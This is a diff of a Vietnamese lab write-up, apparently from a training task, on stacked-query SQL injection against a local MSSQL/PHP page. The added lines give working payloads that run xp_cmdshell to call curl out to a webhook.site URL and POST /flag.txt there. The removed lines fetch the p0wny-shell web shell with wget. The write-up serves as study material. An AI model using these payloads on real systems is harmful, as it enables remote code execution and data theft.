@@ -141,15 +141,19 @@ Và dùng payload :  ";EXEC sp_configure 'show advanced options', 1;RECONFIGURE;
 - Và em nhận được kết quả sau 5s  chứng tỏ là đã reconfig thành công
 ![Alt text](./imageStackQuery/image-4.png)
 
-## Đến đoạn này em thử
-wget https://github.com/flozz/p0wny-shell/blob/master/shell.php
-Đây là shell em hay dùng:v
+- Tiếp sau đó em thực thi shell curl đến webhook của em
 
--  http://localhost/task2_KCSC/demo/stackQuery/index.php?name=items;EXEC%20xp_cmdshell%20%27wget+https://github.com/flozz/p0wny-shell/blob/master/shell.php%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
+ http://localhost/task2_KCSC/demo/stackQuery/index.php?name=items;EXEC%20xp_cmdshell%20%27curl+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
 
-![Alt text](./imagesOOB/image.png)
+Và vào webhook em nhận được
+![Alt text](./imageStackQuery/image-5.png)
 
--- Sau đó em tải được file shell.php và bật nó lên để RCE ạ:<
+Em dùng payload này để lấy thông tin file flag.txt
+;EXEC%20xp_cmdshell%20%27curl+-X+POST+--data+"@/flag.txt"+-H+"Content-Type:+application/data"+https://webhook.site/0e0a8778-5ef0-4657-8aec-84076f5a552e%27;%20WAITFOR%20DELAY%20%270:0:5%27;%20--%20%22
+![Alt text](./imageStackQuery/image-6.png)
+Và kết quả:
+![Alt text](./imageStackQuery/image-7.png)
+Và em nhận được thông tin vậy là em đã RCE được sever @@
 
 
 
